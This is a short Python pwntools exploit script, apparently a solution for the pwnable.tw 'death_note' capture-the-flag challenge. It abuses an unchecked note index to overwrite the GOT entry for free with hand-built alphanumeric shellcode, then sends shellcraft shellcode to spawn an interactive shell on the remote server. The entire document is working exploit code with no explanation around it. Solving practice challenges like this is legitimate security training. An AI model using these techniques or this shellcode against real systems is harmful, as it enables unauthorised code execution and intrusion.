#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10201)
#r = remote('127.0.0.1', 7122)
elf = ELF('./death_note')

def menu():
	r.recvuntil('choice :')

def add(idx, name):
	menu()
	r.send('1\n')
	r.recvuntil('Index :')
	r.send('%d\n' % idx)
	r.recvuntil('Name :')
	#r.interactive()
	r.send(name+'\n')

def dele(idx):
	menu()
	r.send('3\n')
	r.recvuntil('Index :')
	r.send('%d\n' % idx)

note = elf.symbols['note']
free_got = elf.got['free']
print 'free got:', hex(free_got)

shellcode = [
	# eax = ebx = 0
	# ecx = heap addr
	# edx = big num
	'RR',		# push edx * 2 (edx is 0)
	'X[',		# pop eax; pop ebx
	'Z',		# pop edx (edx = big num)
	'Y',		# pop ecx (heap addr is in stack)
	# make int 0x80
	'H',		# dec eax
	'42',		# xor al, 0x32 (al = 0xcd)
	'0A\x28',	# xor BYTE PTR [ecx+0x20],al
	'A',		# inc ecx
	'4M',		# xor al, 0x4d (al = 0x80)
	'0A\x28',	# xor BYTE PTR [ecx+0x20],al
	# eax = 4
	'S',		# push ebx (ebx is 0)
	'X',		# pop eax
	'@@@',		# inc eax * 3
	'P',		# push eax (nop)
]

add(0, 'asdf')
free_got_idx = (free_got-note)/4
add(free_got_idx, flat(shellcode))
#raw_input('@')

dele(0)
r.sendline('\x90'*0x40+asm(shellcraft.sh()))
r.interactive()


